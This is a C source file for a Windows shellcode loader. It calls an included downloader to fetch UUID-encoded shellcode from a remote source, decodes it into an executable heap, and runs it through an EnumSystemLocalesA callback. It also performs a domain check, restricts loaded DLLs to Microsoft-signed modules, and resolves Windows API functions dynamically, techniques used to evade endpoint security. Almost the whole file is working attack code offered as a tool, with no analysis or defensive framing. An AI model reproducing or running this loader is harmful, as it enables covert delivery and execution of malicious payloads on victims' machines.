#include "headers.h"
#include "checks.h"
#include "downloader.h"

#pragma comment(lib, "Rpcrt4.lib")



typedef HANDLE(WINAPI* _HeapCreate)(
    DWORD flOptions,
    SIZE_T dwInitialSize,
    SIZE_T dwMaximumSize
    );


typedef LPVOID(WINAPI* _HeapAlloc)(
   HANDLE hHeap,
   DWORD dwFlags,
   SIZE_T dwBytes
);


typedef RPC_STATUS(RPC_ENTRY* _UuidtoString)(
    RPC_CSTR StringUuid,
    UUID* Uuid
);


typedef BOOL(WINAPI* _EnSysLocal)(
     LOCALE_ENUMPROCA lpLocaleEnumProc,
     DWORD            dwFlags);


typedef BOOL(WINAPI* _Chandle)(
    HANDLE hObject
);

typedef BOOL(WINAPI* _SetProcessMitigationPolicy)(
     PROCESS_MITIGATION_POLICY MitigationPolicy,
    PVOID lpBuffer,
    SIZE_T dwLength
);



DWORD dllpolicy() {


    PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sp = {};
    sp.MicrosoftSignedOnly = 1;
    
    HMODULE Hmod = GetModuleHandleA("Kernel32.dll");
    _SetProcessMitigationPolicy SetPolicy = (_SetProcessMitigationPolicy)GetProcAddress(Hmod, "SetProcessMitigationPolicy");

    PROCESS_MITIGATION_POLICY  policy = ProcessSignaturePolicy;

    SetPolicy(policy, &sp, sizeof(sp));

    return 0;
}


DWORD codepolicy() {

    PROCESS_MITIGATION_DYNAMIC_CODE_POLICY  sp = {};
    sp.ProhibitDynamicCode = 1;
   
    HMODULE Hmod = GetModuleHandleA("Kernel32.dll");
    _SetProcessMitigationPolicy SetPolicy = (_SetProcessMitigationPolicy)GetProcAddress(Hmod, "SetProcessMitigationPolicy");

    PROCESS_MITIGATION_POLICY  policy = ProcessDynamicCodePolicy;

    SetPolicy(policy, &sp, sizeof(sp));

    return 0;
}

int main()
{


    DomainCheck();

    printf("INitialize Loader\n");

    dllpolicy();
  



    HMODULE rpcdll = GetModuleHandleA("Rpcrt4.dll");
    
    HMODULE Hmod = GetModuleHandleA("Kernel32.dll");

    _HeapCreate HeapC = (_HeapCreate)GetProcAddress(Hmod, "HeapCreate");
    _HeapAlloc HeapAC = (_HeapAlloc)GetProcAddress(Hmod, "HeapAlloc");
    _EnSysLocal ensys = (_EnSysLocal)GetProcAddress(Hmod, "EnumSystemLocalesA");
    _UuidtoString uuid = (_UuidtoString)GetProcAddress(rpcdll, "UuidFromStringA");
    _Chandle CHandle = (_Chandle)GetProcAddress(Hmod, "CloseHandle");


    HANDLE hc = HeapC(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    void* ha = HeapAC(hc, 0, 0x100000);
    DWORD_PTR hptr = (DWORD_PTR)ha;

    // update policy to avoid RWX after our heap creates lol
    codepolicy();

    

    char* buf = download();    

    printf("Outout: %s\n", buf);

    char* p2str;
    char* uuids[32];
    char* token;

    token = strtok_s(buf, "\n", &p2str);

    printf("Tken: %s\n", token);

   
    int i = 0;
    while ((token != NULL)) {
        if (token != NULL) {
            uuids[i] = token;
            token = strtok_s(NULL, "\n", &p2str);
            i++;
        }
    }

    int elems = i;
    for (int i = 0; i < elems; i++) {
        printf("[+] Token '%d' - %s\n", i, uuids[i]);
    }



    printf("length : %d\n", sizeof(uuids));

    printf("first: %s\n", uuids[0]);


    for (int i = 0; i < elems; i++) {
        
        // Dynamic Resolve UUIDfromStringA function also
        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);
        if (status != RPC_S_OK) {
            printf("UuidFromStringA() != S_OK\n");
            CHandle(ha);
            return -1;
        }
        hptr += 16;
    }


    printf("[*] Hexdump: ");
    for (int i = 0; i < elems * 16; i++) {
        printf("%02X ", ((unsigned char*)ha)[i]);
    }

   
    ensys((LOCALE_ENUMPROCA)ha, 0);
    CHandle(ha);
    return 0; 
}